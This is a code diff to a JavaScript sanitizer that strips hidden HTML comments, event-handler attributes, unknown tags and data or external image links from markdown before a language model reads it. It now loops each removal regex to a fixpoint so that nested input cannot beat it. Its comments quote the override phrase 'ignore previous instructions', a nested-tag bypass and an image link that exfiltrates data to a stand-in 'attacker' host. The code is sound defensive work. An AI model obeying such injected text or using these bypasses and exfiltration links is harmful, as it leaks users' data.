@@ -161,14 +161,19 @@
   // SCOPE: closes INVISIBLE traps (hidden HTML, smuggled URIs, invisible Unicode). It does NOT
   // and cannot stop visible adversarial prose ("ignore previous instructions…") — that is residual
   // risk handled only by the UNTRUSTED-CONTENT fence + the downstream model.
+  // Re-run a removal regex to a fixpoint: stripping one match can re-expose the same pattern
+  // from the surrounding text (e.g. `<scr<script>ipt>` → `<script>`, or nested `<!--<!-- -->-->`).
+  // A single pass is defeatable; loop until the string stops changing.
+  function stripStable(s, re) { let prev; do { prev = s; s = s.replace(re, ''); } while (s !== prev); return s; }
+
   function postProcess(md) {
     // HTML comments: invisible in rendered markdown, read by LLMs (documented injection class).
-    md = md.replace(/<!--[\s\S]*?-->/g, '');
+    md = stripStable(md, /<!--[\s\S]*?-->/g);
     // strip on* event-handler attributes from any surviving tag (img/a/blockquote are allowlisted
     // below but keep their attributes — an <img onerror=…> would otherwise pass through).
-    md = md.replace(/\s+on\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
+    md = stripStable(md, /\s+on\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi);
     // unknown tags Turndown emitted as raw HTML (keep only a safe inline allowlist)
-    md = md.replace(/<(?!\/?(a|img|code|pre|em|strong|kbd|blockquote)\b)[^>]+>/gi, '');
+    md = stripStable(md, /<(?!\/?(a|img|code|pre|em|strong|kbd|blockquote)\b)[^>]+>/gi);
     // images: data: URIs carry active SVG; external URLs auto-exfiltrate when a chat UI renders
     // them (![](https://attacker/?data=…)). Neutralize BOTH to a text placeholder, keep the alt.
     md = md.replace(/!\[([^\]]*)\]\((?:data:|https?:\/\/|file:)[^)]*\)/gi, (m, alt) => `[image: ${alt || 'removed'}]`);
